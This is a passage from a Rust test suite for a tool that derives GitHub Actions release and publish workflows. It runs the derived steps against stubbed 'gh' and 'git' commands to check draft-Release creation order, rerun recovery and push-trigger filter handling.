            .position(|step| step["uses"].as_str() == Some(ATTEST_BUILD_PROVENANCE_ACTION))
            .expect("closure invokes the pinned attestation Action");
        let freeze = steps
            .iter()
            .position(|step| {
                step["run"]
                    .as_str()
                    .is_some_and(|body| body.contains("--draft=false"))
            })
            .expect("closure freezes the Release");
        assert!(attestation < freeze, "attestation completes before closure");
        let subjects = steps[attestation]["with"]["subject-path"]
            .as_str()
            .expect("the invocation names its subjects");
        assert!(
            subjects.contains("intentional-evidence.yml") && subjects.contains("attachments/*"),
            "the invocation attests the statement and every contributed attachment: {subjects}"
        );
    }

    /// The shell of the derived authority transition, in runner order.
    fn authority_script(root: &Path) -> String {
        job_script(root, WorkflowRole::Release, "intentional_release")
    }

    /// What executing one derived privileged step did.
    struct Executed {
        /// Whether the step succeeded.
        succeeded: bool,
        /// Command line of every stubbed invocation the step made.
        invocations: String,
        /// Everything the step wrote to standard error.
        diagnostics: String,
    }

    /// A stand-in runner: a scratch directory, stubbed commands, and one log.
    ///
    /// One runner executes every step of a job in turn, because the steps of a
    /// managed job are not independent: the upload job resolves the draft once
    /// and writes what it resolved to a file a later step reads, and a harness
    /// that gave each step its own scratch directory would prove each step in a
    /// world the runner never produces.
    ///
    /// Nothing is inherited from this process. `PATH` reaches the stubs and
    /// `RUNNER_TEMP` is the scratch directory; every other value a body reads
    /// comes from the step's own parsed `env:` block, so a body naming a
    /// variable the block does not declare runs empty here exactly as it would
    /// on a runner.
    ///
    /// The stubs and their log live outside the converged fixture so test
    /// scaffolding never lands in the tree the derivation produced.
    struct StubRunner {
        scaffold: Workspace,
        /// Values the stubs read, beyond the step's own environment.
        settings: BTreeMap<String, String>,
    }

    impl StubRunner {
        fn new(label: &str) -> Self {
            let scaffold = Workspace::new(label);
            std::fs::create_dir_all(scaffold.root().join("runner-temp"))
                .expect("the runner scratch directory exists");
            Self {
                scaffold,
                settings: BTreeMap::new(),
            }
        }

        /// The scratch directory `runner.temp` and `RUNNER_TEMP` both name.
        fn temp(&self) -> PathBuf {
            self.scaffold.root().join("runner-temp")
        }

        /// Install one stubbed executable on the runner's `PATH`.
        fn stub(self, name: &str, body: &str) -> Self {
            use std::os::unix::fs::PermissionsExt;

            let stub = self.scaffold.root().join(name);
            std::fs::write(&stub, body).expect("the stub is written");
            std::fs::set_permissions(&stub, std::fs::Permissions::from_mode(0o755))
                .expect("the stub is executable");
            self
        }

        /// Set one value the stubs read.
        fn setting(mut self, key: &str, value: &str) -> Self {
            self.settings.insert(key.to_owned(), value.to_owned());
            self
        }

        /// The workflow contexts this runner resolves for a step's `env:` block.
        fn contexts(&self) -> BTreeMap<String, String> {
            BTreeMap::from([
                (
                    "${{ runner.temp }}".to_owned(),
                    self.temp().display().to_string(),
                ),
                (
                    "${{ github.repository }}".to_owned(),
                    REPOSITORY_IDENTITY.to_owned(),
                ),
            ])
        }

        fn execute(&self, script: &str, environment: &BTreeMap<String, String>) -> Executed {
            let log = self.scaffold.root().join("invocations");
            let mut command = std::process::Command::new("bash");
            command
                .args(["-c", script])
                .env_clear()
                .env(
                    "PATH",
                    format!(
                        "{}:{}",
                        self.scaffold.root().display(),
                        test_tool_path("/usr/bin:/bin")
                    ),
                )
                .env("RUNNER_TEMP", self.temp().display().to_string())
                .env("GH_STUB_LOG", log.display().to_string());
            for (key, value) in self.settings.iter().chain(environment) {
                command.env(key, value);
            }
            let output = command.output().expect("the managed step runs");
            Executed {
                succeeded: output.status.success(),
                invocations: std::fs::read_to_string(&log).unwrap_or_default(),
                diagnostics: String::from_utf8_lossy(&output.stderr).into_owned(),
            }
        }
    }

    /// Repository the stand-in runner claims to be running in.
    const REPOSITORY_IDENTITY: &str = "example-owner/example-repo";

    /// One step's `env:` block with every workflow expression resolved.
    ///
    /// Resolution is what binds the two halves of a step: the block names the
    /// variables and the body reads them, and a body reading a name the block
    /// does not declare would run with an empty value on a runner. A value still
    /// carrying an expression after resolution is refused rather than passed
    /// through, because a test that ran against an unexpanded `${{ ... }}`
    /// asserts against a placeholder the runner would never supply.
    fn resolved_environment(
        step: &Value,
        bindings: &BTreeMap<String, String>,
        label: &str,
    ) -> BTreeMap<String, String> {
        step["env"]
            .as_mapping()
            .unwrap_or_else(|| panic!("the {label} step names its inputs"))
            .iter()
            .map(|(key, value)| {
                let key = key
                    .as_str()
                    .expect("an environment name is a scalar")
                    .to_owned();
                let mut resolved = value
                    .as_str()
                    .expect("an environment value is a scalar")
                    .to_owned();
                for (expression, substitute) in bindings {
                    resolved = resolved.replace(expression.as_str(), substitute);
                }
                assert!(
                    !resolved.contains("${{"),
                    "the {label} step reads {key} from {resolved}, which no verified output or bound context supplies"
                );
                (key, resolved)
            })
            .collect()
    }

    /// The derived draft-creation step and the environment it declares.
    fn draft_creation(
        root: &Path,
        runner: &StubRunner,
        tag: &str,
    ) -> (String, BTreeMap<String, String>) {
        let step = privileged_step(
            root,
            WorkflowRole::Release,
            "intentional_release",
            "gh release create",
        );
        // The verified step outputs the transition produced, plus the workflow
        // contexts a runner would expand. Anything the step names that is
        // neither is refused, because an ambient value that happens to agree
        // with the verified identity today is exactly the substitution this job
        // cannot take.
        let mut bindings = runner.contexts();
        for (name, value) in [
            ("token", "stub-installation-token"),
            ("global-tag", tag),
            ("source-sha", "0000000000000000000000000000000000000000"),
            ("release-sha", "1111111111111111111111111111111111111111"),
        ] {
            bindings.insert(
                format!("${{{{ steps.intentional_handoff.outputs.{name} }}}}"),
                value.to_owned(),
            );
            bindings.insert(
                format!("${{{{ steps.intentional_token.outputs.{name} }}}}"),
                value.to_owned(),
            );
        }
        let environment = resolved_environment(&step, &bindings, "draft-creation");
        let script = step["run"]
            .as_str()
            .expect("the creation step runs a script")
            .to_owned();
        (script, environment)
    }

    /// The one step of a managed job whose body contains `fragment`.
    fn privileged_step(root: &Path, role: WorkflowRole, id: &str, fragment: &str) -> Value {
        managed_steps(root, role)
            .into_iter()
            .find(|(job, _)| job == id)
            .unwrap_or_else(|| panic!("the {id} job is derived"))
            .1
            .into_iter()
            .find(|step| {
                step.get("run")
                    .and_then(Value::as_str)
                    .is_some_and(|body| body.contains(fragment))
            })
            .unwrap_or_else(|| panic!("the {id} job runs a step containing `{fragment}`"))
    }

    /// Execute the derived draft-creation step against a stubbed `gh`.
    fn run_draft_creation(root: &Path, gh: &str) -> Executed {
        let runner = StubRunner::new("draft-creation-scaffold").stub("gh", gh);
        let (script, environment) = draft_creation(root, &runner, "component@1.2.3");
        runner.execute(&script, &environment)
    }

    const AUTHORITY_SOURCE: &str = "0000000000000000000000000000000000000000";
    const AUTHORITY_RELEASE: &str = "1111111111111111111111111111111111111111";
    const AUTHORITY_TAG_OBJECT: &str = "2222222222222222222222222222222222222222";

    /// The publish step and parsed environment a runner executes before draft recovery.
    fn authority_push(root: &Path, runner: &StubRunner) -> (String, BTreeMap<String, String>) {
        let step = privileged_step(
            root,
            WorkflowRole::Release,
            "intentional_release",
            "git push --atomic",
        );
        let mut bindings = runner.contexts();
        bindings.insert(
            "${{ github.event.repository.default_branch }}".to_owned(),
            "main".to_owned(),
        );
        for (name, value) in [
            ("token", "stub-installation-token"),
            ("global-tag", CLOSURE_TAG),
            ("source-sha", AUTHORITY_SOURCE),
            ("release-sha", AUTHORITY_RELEASE),
        ] {
            bindings.insert(
                format!("${{{{ steps.intentional_handoff.outputs.{name} }}}}"),
                value.to_owned(),
            );
            bindings.insert(
                format!("${{{{ steps.intentional_token.outputs.{name} }}}}"),
                value.to_owned(),
            );
        }
        let environment = resolved_environment(&step, &bindings, "authority-push");
        (
            step["run"]
                .as_str()
                .expect("the authority push step runs")
                .to_owned(),
            environment,
        )
    }

    const GIT_AUTHORITY_RERUN_STUB: &str = r#"#!/usr/bin/env bash
printf 'git %s\n' "$*" >> "${GH_STUB_LOG}"
case "$1" in
  remote) ;;
  ls-remote)
    case "$3" in
      refs/heads/*) printf '%s\t%s\n' "${GIT_STUB_BRANCH}" "$3" ;;
      refs/tags/*) printf '%s\t%s\n' "${GIT_STUB_REMOTE_TAG}" "$3" ;;
    esac
    ;;
  rev-parse) printf '%s\n' "${GIT_STUB_LOCAL_TAG}" ;;
  push)
    if test "${GIT_STUB_PUSH}" != allow; then
      printf 'unexpected push on recovery\n' >&2
      exit 65
    fi
    ;;
esac
exit 0
"#;

    fn authority_rerun_runner(label: &str, remote_tag: &str) -> StubRunner {
        StubRunner::new(label)
            .stub("git", GIT_AUTHORITY_RERUN_STUB)
            .stub("gh", &gh_stub("    printf 'true\n'"))
            .setting("GITHUB_REPOSITORY", REPOSITORY_IDENTITY)
            .setting("GIT_STUB_BRANCH", AUTHORITY_RELEASE)
            .setting("GIT_STUB_REMOTE_TAG", remote_tag)
            .setting("GIT_STUB_LOCAL_TAG", AUTHORITY_TAG_OBJECT)
            .setting("GIT_STUB_PUSH", "refuse")
    }

    /// A `gh` stub that records its arguments and answers `release view` with
    /// `view`, a shell fragment standing in for one state of the Release.
    fn gh_stub(view: &str) -> String {
        format!(
            "#!/usr/bin/env bash\nprintf '%s\\n' \"$*\" >> \"${{GH_STUB_LOG}}\"\n\
             case \"$*\" in\n  *'release view'*)\n{view}\n    ;;\nesac\nexit 0\n"
        )
    }

    /// The Release does not exist, in the words `gh` uses to say so.
    const GH_RELEASE_ABSENT: &str = "    printf 'release not found\\n' >&2\n    exit 1";
    /// The Release state could not be resolved at all.
    const GH_RELEASE_UNRESOLVED: &str =
        "    printf 'HTTP 503: Service Unavailable\\n' >&2\n    exit 1";

    // A draft cannot be created for a tag the remote does not yet carry, so the
    // creation step is only correct downstream of the atomic push. Order is
    // asserted by relative offset rather than by presence because a step that
    // exists in the wrong place reads as harmless in review and fails on a
    // release runner, after the branch has already moved.
    #[test]
    fn creates_the_draft_release_only_after_the_tag_is_pushed() {
        let workspace = workspace("workflow-draft-creation-order");
        converge(workspace.root(), WorkflowRole::Release);
        let script = authority_script(workspace.root());

        assert!(
            offset_within(&script, "git push --atomic")
                < offset_within(&script, "gh release create"),
            "the global release tag is published before a draft is created for it: {script}"
        );
    }

    // The draft names the tag the handoff verification proved, taken from the
    // same verified step outputs the push consumes. `github.ref_name` and the
    // configured template are both ambient values that agree with the verified
    // identity right up until they do not, and a draft created for the wrong
    // tag is a Release the closure job cannot find.
    #[test]
    fn binds_the_verified_release_tag_to_the_draft_creation_step() {
        let workspace = workspace("workflow-draft-creation-identity");
        converge(workspace.root(), WorkflowRole::Release);
        let steps = managed_steps(workspace.root(), WorkflowRole::Release)
            .into_iter()
            .find(|(id, _)| id == "intentional_release")
            .expect("the authority transition is derived")
            .1;

        let (verifier, action) = steps
            .iter()
            .find_map(|step| {
                let (name, _) = intentional_action(step)?;
                (name == "verify-handoff")
                    .then(|| (step["id"].as_str().expect("the step is addressable"), name))
            })
            .expect("the authority transition verifies the handoff through the Action");
        let creation = steps
            .iter()
            .find(|step| {
                step.get("run")
                    .and_then(Value::as_str)
                    .is_some_and(|body| body.contains("gh release create"))
            })
            .expect("the authority transition creates the draft Release");

        let consumed = creation["env"]
            .as_mapping()
            .expect("the creation step names its inputs")
            .values()
            .filter_map(Value::as_str)
            .filter_map(|value| {
                value
                    .strip_prefix(&format!("${{{{ steps.{verifier}.outputs."))?
                    .strip_suffix(" }}")
                    .map(str::to_owned)
            })
            .collect::<BTreeSet<_>>();
        assert_eq!(
            consumed,
            ["global-tag".to_owned()]
                .into_iter()
                .collect::<BTreeSet<_>>(),
            "the creation step reads the released tag from the verifying step"
        );
        assert!(
            action_outputs(&action).contains("global-tag"),
            "{action} declares the verified tag identity the creation step reads"
        );
    }

    // `immutable-github-release` states that a failure before closure leaves a
    // resumable draft, so creation is create-if-absent and a rerun continues
    // against the draft it already made. The step is executed rather than read:
    // a conditional that looks right and creates a second Release anyway is the
    // failure this proves cannot happen.
    #[test]
    fn resumes_an_existing_draft_rather_than_creating_a_second_release() {
        let workspace = workspace("workflow-draft-creation-rerun");
        converge(workspace.root(), WorkflowRole::Release);

        let first = run_draft_creation(workspace.root(), &gh_stub(GH_RELEASE_ABSENT));
        assert!(
            first.succeeded,
            "the first run creates the draft: {}",
            first.diagnostics
        );
        assert!(
            first.invocations.contains("release create") && first.invocations.contains("--draft"),
            "the first run creates the Release as a draft: {}",
            first.invocations
        );

        let rerun = run_draft_creation(workspace.root(), &gh_stub("    printf 'true\\n'"));
        assert!(
            rerun.succeeded,
            "a rerun against an existing draft succeeds: {}",
            rerun.diagnostics
        );
        assert!(
            !rerun.invocations.contains("release create"),
            "a rerun against an existing draft creates nothing: {}",
            rerun.invocations
        );
    }

    #[test]
    fn rerun_after_the_atomic_push_reaches_draft_recovery() {
        let workspace = workspace("workflow-authority-push-rerun");
        converge(workspace.root(), WorkflowRole::Release);
        let runner =
            authority_rerun_runner("workflow-authority-push-rerun-runner", AUTHORITY_TAG_OBJECT);
        let (push, push_environment) = authority_push(workspace.root(), &runner);

        let published = runner.execute(&push, &push_environment);
        assert!(
            published.succeeded,
            "the transition accepts the complete atomic-push state: {}",
            published.diagnostics
        );
        assert!(
            published
                .invocations
                .contains("git ls-remote origin refs/heads/main")
                && published
                    .invocations
                    .contains(&format!("git ls-remote origin refs/tags/{CLOSURE_TAG}"))
                && published
                    .invocations
                    .contains(&format!("git rev-parse refs/tags/{CLOSURE_TAG}"))
                && !published.invocations.contains("git push --atomic"),
            "the rerun verifies the landed branch and tag without pushing again: {}",
            published.invocations
        );

        let (draft, draft_environment) = draft_creation(workspace.root(), &runner, CLOSURE_TAG);
        let recovered = runner.execute(&draft, &draft_environment);
        assert!(
            recovered.succeeded && recovered.invocations.contains("release view"),
            "the same rerun reaches draft recovery: {}\n{}",
            recovered.invocations,
            recovered.diagnostics
        );
    }

    #[test]
    fn first_authority_transition_atomically_pushes_the_release_and_tag() {
        let workspace = workspace("workflow-authority-push-first");
        converge(workspace.root(), WorkflowRole::Release);
        let runner =
            authority_rerun_runner("workflow-authority-push-first-runner", AUTHORITY_TAG_OBJECT)
                .setting("GIT_STUB_BRANCH", AUTHORITY_SOURCE)
                .setting("GIT_STUB_PUSH", "allow");
        let (push, environment) = authority_push(workspace.root(), &runner);

        let executed = runner.execute(&push, &environment);
        assert!(
            executed.succeeded,
            "the accepted source advances atomically: {}",
            executed.diagnostics
        );
        assert!(
            executed.invocations.contains(&format!(
                "git push --atomic origin {AUTHORITY_RELEASE}:refs/heads/main refs/tags/{CLOSURE_TAG}"
            )),
            "the first run publishes R and its verified tag together: {}",
            executed.invocations
        );
    }

    #[test]
    fn refuses_a_partially_published_authority_transition() {
        let workspace = workspace("workflow-authority-push-partial");
        converge(workspace.root(), WorkflowRole::Release);
        let runner = authority_rerun_runner(
            "workflow-authority-push-partial-runner",
            "3333333333333333333333333333333333333333",
        );
        let (push, environment) = authority_push(workspace.root(), &runner);

        let executed = runner.execute(&push, &environment);
        assert!(!executed.succeeded, "a mismatched remote tag is refused");
        assert!(
            executed.diagnostics.contains("instead of verified object"),
            "the refusal names the incomplete atomic state: {:?}",
            executed.diagnostics
        );
    }

    #[test]
    fn refuses_an_authority_transition_from_an_unrelated_branch_head() {
        let workspace = workspace("workflow-authority-push-unrelated");
        converge(workspace.root(), WorkflowRole::Release);
        let runner = authority_rerun_runner(
            "workflow-authority-push-unrelated-runner",
            AUTHORITY_TAG_OBJECT,
        )
        .setting(
            "GIT_STUB_BRANCH",
            "3333333333333333333333333333333333333333",
        );
        let (push, environment) = authority_push(workspace.root(), &runner);

        let executed = runner.execute(&push, &environment);
        assert!(!executed.succeeded, "an unrelated branch head is refused");
        assert!(
            executed.diagnostics.contains("not accepted source")
                && !executed.invocations.contains("git push --atomic"),
            "the branch mismatch stops before push: {:?}\n{}",
            executed.diagnostics,
            executed.invocations
        );
    }

    // `gh` writes notices, deprecations and update prompts to standard error on
    // calls that succeed, so a success path that merged the streams would make
    // every one of those bytes part of the value it compares. The draft would be
    // perfectly good and the transition would fail on it. The witness is a stub
    // that answers `true` and writes a notice while exiting zero: merged, the
    // comparison sees the notice and refuses; separated, it sees `true` and
    // resumes.
    #[test]
    fn resumes_a_draft_whose_resolution_wrote_a_notice_while_succeeding() {
        let workspace = workspace("workflow-draft-creation-notice");
        converge(workspace.root(), WorkflowRole::Release);

        let noisy = run_draft_creation(
            workspace.root(),
            &gh_stub("    printf 'a new release of gh is available\\n' >&2\n    printf 'true\\n'"),
        );
        assert!(
            noisy.succeeded,
            "a notice on the success path is not part of the resolved state: {}",
            noisy.diagnostics
        );
        assert!(
            !noisy.invocations.contains("release create"),
            "the existing draft is resumed rather than recreated: {}",
            noisy.invocations
        );
    }

    // The step names the repository it writes to rather than inheriting one.
    // The push step immediately before it rewrote `origin` to embed the
    // installation token, so a `gh` that resolved the repository from the
    // remote would take the Release the whole publication protocol keys on from
    // a URL another step mutated. That is an unstated cross-step dependency in
    // the one step that creates the Release, which is why it is asserted.
    #[test]
    fn names_the_repository_the_draft_release_is_created_in() {
        let workspace = workspace("workflow-draft-creation-repository");
        converge(workspace.root(), WorkflowRole::Release);
        let steps = managed_steps(workspace.root(), WorkflowRole::Release)
            .into_iter()
            .find(|(id, _)| id == "intentional_release")
            .expect("the authority transition is derived")
            .1;
        let creation = steps
            .iter()
            .find(|step| {
                step.get("run")
                    .and_then(Value::as_str)
                    .is_some_and(|body| body.contains("gh release create"))
            })
            .expect("the authority transition creates the draft Release");

        assert_eq!(
            creation["env"]["GH_REPO"].as_str(),
            Some("${{ github.repository }}"),
            "the creation step states the repository the draft lands in"
        );
    }

    // The tag must already exist on the remote for the draft to attach to the
    // release this transition published. Without `--verify-tag`, `gh release
    // create` against a missing tag does not fail: it creates the tag at the
    // default-branch head, and the Release is attached to a tag Intentional
    // never made and never verified. The ordering test proves the template
    // orders the two steps; this is the half that proves it on the runner, so
    // it is asserted on the invocation the step actually made.
    #[test]
    fn creates_the_draft_only_against_a_tag_the_remote_already_carries() {
        let workspace = workspace("workflow-draft-creation-tag-verified");
        converge(workspace.root(), WorkflowRole::Release);

        let executed = run_draft_creation(workspace.root(), &gh_stub(GH_RELEASE_ABSENT));
        assert!(
            executed.succeeded,
            "the draft is created: {}",
            executed.diagnostics
        );
        let creation = executed
            .invocations
            .lines()
            .find(|line| line.contains("release create"))
            .expect("the step creates the Release");
        assert!(
            creation.contains("--verify-tag"),
            "creation refuses a tag the remote does not carry: {creation}"
        );
    }

    // `gh release view` fails for a Release that does not exist and equally for
    // a rate limit, a 5xx, or a revoked token. Reading every failure as absence
    // turns the one case create-if-absent exists to serve -- a rerun where the
    // draft does exist -- into a hard failure reported as a tag collision. The
    // step is executed because the difference is entirely in what the failing
    // command said, which no reading of the template can show.
    #[test]
    fn refuses_a_release_state_it_could_not_resolve_rather_than_assuming_absence() {
        let workspace = workspace("workflow-draft-creation-unresolved");
        converge(workspace.root(), WorkflowRole::Release);

        let executed = run_draft_creation(workspace.root(), &gh_stub(GH_RELEASE_UNRESOLVED));
        assert!(
            !executed.succeeded,
            "an unresolved Release state stops the transition: {}",
            executed.invocations
        );
        assert!(
            !executed.invocations.contains("release create"),
            "an unresolved Release state is not treated as absence: {}",
            executed.invocations
        );
        assert!(
            executed.diagnostics.contains("could not be resolved")
                && executed.diagnostics.contains("503"),
            "the refusal reports what the resolution said: {:?}",
            executed.diagnostics
        );
    }

    // The other existing-Release case is not resumable. A Release that is no
    // longer a draft has already been closed and frozen, so continuing would
    // carry the transition on toward publishers that upload onto an immutable
    // Release. Refusing here is what keeps create-if-absent from meaning
    // continue-regardless.
    #[test]
    fn refuses_to_continue_when_the_release_for_the_tag_is_already_published() {
        let workspace = workspace("workflow-draft-creation-published");
        converge(workspace.root(), WorkflowRole::Release);

        let executed = run_draft_creation(workspace.root(), &gh_stub("    printf 'false\\n'"));
        assert!(
            !executed.succeeded,
            "the transition refuses a Release that is no longer a draft: {}",
            executed.invocations
        );
        assert!(
            executed.diagnostics.contains("no longer a draft"),
            "the refusal names what it refused rather than exiting silently: {:?}",
            executed.diagnostics
        );
    }

    #[test]
    fn proves_shorthand_triggers_survive_their_expansion() {
        let workspace = workspace("workflow-shorthand-proof");
        workspace.write(
            ".github/workflows/release.yml",
            "name: release\non: [ push, issues ]\njobs:\n  candidate_check:\n    runs-on: ubuntu-latest\n    steps:\n      - run: 'true'\n",
        );
        let config = Config::load(workspace.root()).expect("config loads");
        let namespaces = config
            .github
            .as_ref()
            .expect("github config")
            .namespaces()
            .expect("namespaces");
        let contract = release_contract(&namespaces, &[]).expect("contract derives");
        let text = std::fs::read_to_string(workspace.root().join(".github/workflows/release.yml"))
            .expect("workflow readable");
        let (output, _) =
            reconcile(Document::parse(&text).expect("parses"), &contract).expect("reconciles");
        let parsed: Value = serde_yaml::from_str(&output).expect("output parses");

        // The comparison runs against the expanded form, so a defect that drops
        // a shorthand trigger is refused rather than passing unnoticed.
        let expanded: Value =
            serde_yaml::from_str("on:\n  push:\n  issues:\n").expect("expanded input");
        preserves_repository_content(&expanded, &parsed, &contract)
            .expect("every shorthand trigger survives expansion");
        let mut damaged = parsed.clone();
        damaged["on"]
            .as_mapping_mut()
            .expect("triggers")
            .remove(Value::String("issues".to_owned()));
        let diagnostic = preserves_repository_content(&expanded, &damaged, &contract)
            .expect_err("a dropped shorthand trigger is refused");
        assert_eq!(diagnostic.path.as_deref(), Some("on.issues"));
    }

    #[test]
    fn expands_shorthand_triggers_instead_of_discarding_them() {
        let workspace = workspace("workflow-shorthand");
        workspace.write(
            ".github/workflows/release.yml",
            "name: release\non: [ push, issues ]\njobs:\n  candidate_check:\n    runs-on: ubuntu-latest\n    steps:\n      - run: 'true'\n",
        );
        converge(workspace.root(), WorkflowRole::Release);
        let document: Value =
            serde_yaml::from_str(&workflow(workspace.root(), WorkflowRole::Release))
                .expect("result parses");
        let triggers = document["on"].as_mapping().expect("trigger mapping");
        for trigger in ["push", "issues", "workflow_dispatch"] {
            assert!(
                triggers.contains_key(Value::String(trigger.to_owned())),
                "{trigger} survives shorthand expansion: {triggers:?}"
            );
        }
    }

    #[test]
    fn preserves_branch_pushes_when_publish_derivation_adds_tag_filters() {
        let workspace = workspace("workflow-publish-push-shorthand");
        workspace.write(
            ".github/workflows/publish.yml",
            "name: publish\non: push\njobs:\n  artifact_check:\n    runs-on: ubuntu-latest\n    steps:\n      - run: 'true'\n",
        );
        converge(workspace.root(), WorkflowRole::Publish);
        let document: Value =
            serde_yaml::from_str(&workflow(workspace.root(), WorkflowRole::Publish))
                .expect("result parses");

        assert_eq!(
            document["on"]["push"]["branches"].as_sequence(),
            Some(&vec![Value::String("**".to_owned())]),
            "the shorthand's every-branch meaning survives the tag filter"
        );
        assert!(
            document["on"]["push"]["tags"]
                .as_sequence()
                .is_some_and(|tags| !tags.is_empty()),
            "the derived release-tag filter is still present"
        );
    }

    #[test]
    fn leaves_explicit_push_branch_filters_when_publish_derivation_adds_tag_filters() {
        let workspace = workspace("workflow-publish-explicit-push-branches");
        workspace.write(
            ".github/workflows/publish.yml",
            "name: publish\non:\n  push:\n    branches:\n      - main\njobs:\n  artifact_check:\n    runs-on: ubuntu-latest\n    steps:\n      - run: 'true'\n",
        );
        converge(workspace.root(), WorkflowRole::Publish);
        let document: Value =
            serde_yaml::from_str(&workflow(workspace.root(), WorkflowRole::Publish))
                .expect("result parses");

        assert_eq!(
            document["on"]["push"]["branches"].as_sequence(),
            Some(&vec![Value::String("main".to_owned())]),
            "an explicit branch filter is not widened to every branch"
        );
        assert!(
            document["on"]["push"]["tags"]
                .as_sequence()
                .is_some_and(|tags| !tags.is_empty()),
            "the derived release-tag filter is still present"
        );
    }

    #[test]
    fn preserves_branch_pushes_from_empty_mapping_when_publish_derivation_adds_tag_filters() {
        let workspace = workspace("workflow-publish-empty-push-mapping");
        workspace.write(
            ".github/workflows/publish.yml",
            "name: publish\non:\n  push: {}\n  workflow_dispatch:\njobs:\n  artifact_check:\n    runs-on: ubuntu-latest\n    steps:\n      - run: 'true'\n",
        );
        converge(workspace.root(), WorkflowRole::Publish);
        let document: Value =
            serde_yaml::from_str(&workflow(workspace.root(), WorkflowRole::Publish))
                .expect("result parses");

        assert_eq!(
            document["on"]["push"]["branches"].as_sequence(),
            Some(&vec![Value::String("**".to_owned())]),
            "an empty push filter mapping retains every branch push"
        );
        assert!(
            document["on"]["push"]["tags"]
                .as_sequence()
                .is_some_and(|tags| !tags.is_empty()),
            "the derived release-tag filter is still present"
        );
        assert!(
            document["on"]["workflow_dispatch"].is_null(),
            "the neighboring repository trigger survives normalization"
        );
    }

    #[test]
    fn preserves_branch_pushes_from_null_mapping_when_publish_derivation_adds_tag_filters() {
        let workspace = workspace("workflow-publish-null-push-mapping");
        workspace.write(
            ".github/workflows/publish.yml",
            "name: publish\non:\n  push:\n  workflow_dispatch:\njobs:\n  artifact_check:\n    runs-on: ubuntu-latest\n    steps:\n      - run: 'true'\n",
        );
        converge(workspace.root(), WorkflowRole::Publish);
        let document: Value =
            serde_yaml::from_str(&workflow(workspace.root(), WorkflowRole::Publish))
                .expect("result parses");

        assert_eq!(
            document["on"]["push"]["branches"].as_sequence(),
            Some(&vec![Value::String("**".to_owned())]),
            "a null push entry in a trigger mapping retains every branch push"
        );
        assert!(
            document["on"]["push"]["tags"]
                .as_sequence()
                .is_some_and(|tags| !tags.is_empty()),
            "the derived release-tag filter is still present"
        );
        assert!(
            document["on"]["workflow_dispatch"].is_null(),
            "the neighboring repository trigger survives normalization"
        );
    }

    #[test]
    fn does_not_expand_path_filtered_push_mappings_to_all_branches() {
        for filter in ["paths", "paths-ignore"] {
            let mut push = serde_yaml::Mapping::new();
            push.insert(
                Value::String(filter.to_owned()),
                Value::Sequence(vec![Value::String("sample/**".to_owned())]),
            );

            assert!(
                !push_mapping_needs_branch_expansion(&Value::Mapping(push)),
                "{filter} is an explicit push filter, not all-branch shorthand"
            );
        }
    }

    #[test]
    fn refuses_path_filters_that_would_narrow_the_owned_publish_tag_filter() {
        let path_family = PUSH_FILTER_FAMILIES
            .iter()
            .copied()
            .find(|(include, _)| *include == "paths")
            .expect("path filters belong to the platform vocabulary");
        for filter in [path_family.0, path_family.1] {
            let workspace = workspace(&format!("workflow-publish-{filter}"));
            workspace.write(
                ".github/workflows/publish.yml",
                &format!(
                    "name: publish\non:\n  push:\n    {filter}:\n      - sample/**\njobs:\n  artifact_check:\n    runs-on: ubuntu-latest\n    steps:\n      - run: 'true'\n"
                ),
            );

            let comparison = compare_workflow(workspace.root(), WorkflowRole::Publish, None)
                .expect("comparison");
            assert_eq!(comparison.status, ComparisonStatus::Blocked);
            let diagnostic = comparison
                .diagnostics
                .iter()
                .find(|diagnostic| diagnostic.code == "trigger-filter-conflict")
                .expect("the path-narrowed owned tag filter is reported");
            let expected_path = format!("on.push.{filter}");
            assert_eq!(diagnostic.path.as_deref(), Some(expected_path.as_str()));
            assert!(
                comparison.apply().is_err(),
                "a publish trigger narrowed by {filter} is never written"
            );
        }
    }

    #[test]
    fn preserves_branch_pushes_for_every_platform_filter_shape_that_carries_them() {
        let choices = [None, Some(0_usize), Some(1_usize)];
        let branch_family = PUSH_FILTER_FAMILIES
            .iter()
            .copied()
            .find(|(include, _)| *include == "branches")
            .expect("branch filters belong to the platform vocabulary");
        let path_family = PUSH_FILTER_FAMILIES
            .iter()
            .copied()
            .find(|(include, _)| *include == "paths")
            .expect("path filters belong to the platform vocabulary");
        let mut checked = 0;
        for branch_choice in choices {
            for path_choice in choices {
                let workspace = workspace(&format!(
                    "workflow-publish-filter-shape-{branch_choice:?}-{path_choice:?}"
                ));
                let mut push = serde_yaml::Mapping::new();
                for (family, choice) in [(branch_family, branch_choice), (path_family, path_choice)]
                {
                    if let Some(choice) = choice {
                        let filter = [family.0, family.1][choice];
                        push.insert(
                            Value::String(filter.to_owned()),
                            Value::Sequence(vec![Value::String("sample/**".to_owned())]),
                        );
                    }
                }
                let mut authored: Value = serde_yaml::from_str(
                    "name: publish\non: { push: {} }\njobs:\n  artifact_check:\n    runs-on: ubuntu-latest\n    steps:\n      - run: 'true'\n",
                )
                .expect("fixture parses");
                authored["on"]["push"] = Value::Mapping(push.clone());
                workspace.write(
                    ".github/workflows/publish.yml",
                    &serde_yaml::to_string(&authored).expect("fixture renders"),
                );

                let comparison = compare_workflow(workspace.root(), WorkflowRole::Publish, None)
                    .expect("comparison");
                if let Some(path_choice) = path_choice {
                    assert_eq!(comparison.status, ComparisonStatus::Blocked);
                    let filter = [path_family.0, path_family.1][path_choice];
                    let diagnostic = comparison
                        .diagnostics
                        .iter()
                        .find(|diagnostic| diagnostic.code == "trigger-filter-conflict")
                        .expect("the path-narrowed owned tag filter is reported");
                    let expected_path = format!("on.push.{filter}");
                    assert_eq!(diagnostic.path.as_deref(), Some(expected_path.as_str()));
                    checked += 1;
                    continue;
                }
                let emitted: Value = serde_yaml::from_str(
                    comparison
                        .output
                        .as_deref()
                        .expect("different comparison output"),
                )
                .expect("result parses");
                let emitted = emitted["on"]["push"].as_mapping().expect("push mapping");
                for (filter, configured) in &push {
                    assert_eq!(
                        emitted.get(filter),
                        Some(configured),
                        "repository filter {filter:?} survives in shape {push:?}"
                    );
                }
                if branch_choice.is_none() {
                    assert_eq!(
                        emitted
                            .get(Value::String("branches".to_owned()))
                            .and_then(Value::as_sequence),
                        Some(&vec![Value::String("**".to_owned())]),
                        "shape {push:?} keeps the branch pushes it accepted before reconciliation"
                    );
                }
                checked += 1;
            }
        }
        assert_eq!(
            checked,
            choices.len() * choices.len(),
            "the sweep derives every none/include/exclude branch-and-path shape from the platform filter families"
        );
    }

    #[test]
    fn refuses_push_filters_github_treats_as_mutually_exclusive() {
        for (include, exclude) in PUSH_FILTER_FAMILIES {
            let workspace = workspace(&format!("workflow-publish-conflicting-{include}"));
            workspace.write(
                ".github/workflows/publish.yml",
